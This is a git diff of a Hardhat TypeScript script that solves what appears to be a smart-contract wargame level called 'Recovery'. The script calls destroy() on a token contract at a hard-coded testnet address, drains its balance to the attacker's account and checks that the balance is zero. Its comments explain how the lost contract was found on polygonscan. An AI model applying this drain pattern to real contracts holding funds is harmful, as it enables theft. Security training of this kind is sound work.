@@ -2,23 +2,17 @@ import { ethers } from "hardhat";
 import { abi } from "../../artifacts/contracts/17.Recovery/SimpleToken.sol/SimpleToken.json";
 import { Contract } from "ethers";
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract() {
-  const contractAddress = "0x428cE364C5206AAA84dCb415096398c4F8b14106";
-  return new Contract(contractAddress, abi);
-}
-
-async function checkSucces(attacker: SignerWithAddress, target: Contract) {
-  const balance = await attacker.provider!.getBalance(target.address);
-  console.log("Success: ", balance.isZero());
-}
+const targetAddress = "0x1d9Ccd44FD9571c5080FD6C9060286f487515130";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const target = setTargetContract();
+  const target = new Contract(targetAddress, abi, attacker);
   const tx = await target.connect(attacker).destroy(attacker.address);
   await tx.wait();
-  checkSucces(attacker, target);
+  const balance = await attacker.provider!.getBalance(target.address);
+  displayResult(balance.isZero());
 }
 
 main().catch((error) => {
@@ -27,9 +21,7 @@ main().catch((error) => {
 });
 
 // Explanation:
-// You can easily find the contract created by the recovery contract on etherscan for rinkeby
-
-// of the first storage slot of the calling contract.
-// We are going to put there the address of a library we created.
-// This library, if called in delegate call will change the value of the third
-// storage slot of calling contract, which is in our case, owner.
+// You can easily find the contract created by the recovery contract on
+// etherscan/polygonscan.
+// https://mumbai.polygonscan.com/tx/0x127351a3f8a3999f55b3da0c0a46a6c34abade07e02eccb034334baa6cda8a2a
+// Here you can see that the second transfer is done to the lost address.
